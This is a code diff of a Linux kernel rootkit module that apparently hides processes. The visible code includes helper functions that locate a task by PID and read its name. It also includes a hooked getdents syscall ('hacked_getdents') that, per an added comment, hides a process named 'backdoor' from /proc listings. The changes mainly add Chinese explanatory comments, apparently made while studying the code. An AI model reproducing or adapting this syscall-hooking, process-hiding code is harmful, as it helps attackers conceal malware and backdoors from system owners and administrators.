@@ -83,6 +83,7 @@ char * findoffset(char *start)
 }
 
 int myatoi(char *str)
+//string to int
 {
     int res = 0;
     int mul = 1;
@@ -103,7 +104,16 @@ int myatoi(char *str)
 struct task_struct *get_task(pid_t pid)
 {
     struct task_struct *p = get_current(),*entry=NULL;
+    //get_current 进程描述符 linux/sched.h
+    //当进程从用户态切换到内核态时，进程的内核栈总是空的，所以ARM的sp寄存器指向这个栈的顶端。
+    //因此，内核能够轻易地通过sp寄存器获得当前正在CPU上运行的进程
     list_for_each_entry(entry,&(p->tasks),tasks)
+    // #define list_for_each_entry(pos, head, member)              \  
+    // for (pos = list_entry((head)->next, typeof(*pos), member);   \  
+    //      prefetch(pos->member.next), &pos->member != (head);  \  
+    //      pos = list_entry(pos->member.next, typeof(*pos), member))  
+    //pos,head,member
+    // 它实际上是一个 for 循环，利用传入的 pos 作为循环变量，从表头 head 开始，逐项向后（next 方向）移动 pos
     {
         if(entry->pid == pid)
         {
@@ -123,13 +133,17 @@ static inline char *get_name(struct task_struct *p, char *buf)
     int i;
     char *name;
     name = p->comm;
+    //char comm[16];   //进程正在运行的可执行文件名,绝对路径名
+    //得到进程的名字
     i = sizeof(p->comm);
     do {
         unsigned char c = *name;
+        //c是首字母
         name++;
         i--;
         *buf = c;
         if (!c)
+        //c为空breadk
             break;
         if (c == '\\') {
             buf[1] = c;
@@ -146,6 +160,7 @@ static inline char *get_name(struct task_struct *p, char *buf)
         buf++;
     }
     while (i);
+
     *buf = '\n';
     return buf + 1;
 }
@@ -154,6 +169,7 @@ int get_process(pid_t pid)
 {
     struct task_struct *task = get_task(pid);
     //    char *buffer[64] = {0};
+    //get_task,返回目标进程描述符
     char buffer[64];
     if (task)
     {
@@ -186,7 +202,7 @@ asmlinkage long hacked_getdents(unsigned int fd,
         len = dirp->d_reclen;
         tlen = tlen - len;
         printk("%s\n",dirp->d_name);
-                               
+        //如果进程的名字是backdoor则隐藏，这里对/proc/pid的访问                 
         if(get_process(myatoi(dirp->d_name)) )
         {
             printk("find process\n");
